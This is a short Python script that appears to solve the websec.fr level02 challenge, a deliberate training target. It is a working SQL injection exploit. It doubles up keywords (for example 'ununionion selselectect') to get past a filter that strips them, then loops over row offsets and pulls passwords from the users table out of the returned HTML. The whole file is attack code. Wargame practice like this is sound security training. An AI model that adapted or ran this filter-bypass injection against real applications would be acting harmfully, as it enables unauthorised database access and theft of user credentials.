import requests

TARGET_URL = 'https://websec.fr/level02'

def getTableName(s,i):
    data = {
        "user_id":f"1 ununionion selselectect null,password FRfromOM users ororderder bbyy id limit 1 offset {i};--",
        "submit":"Submit"
    }
    res = s.post(f"{TARGET_URL}/index.php",data=data)
    try:
        i = res.text.index("<p class=\"well\">")
        j = res.text[i:].index("</div>")
        response = res.text[i:i+j]
        i = response.index("<br />username -> ")
        i = i + len("<br />username -> ")
        j = response[i:].index("<br />")
        response = response[i:i+j]
        return response
    except:
        return None

def getTables():
    i = 0
    while(True):
        s = getSession()
        res = getTableName(s,i)
        i+=1
        if(res == None):
            break
        else:
            print(res)

def getSession():
    s = requests.Session()
    res = s.get(f"{TARGET_URL}/index.php")
    return s

getTables()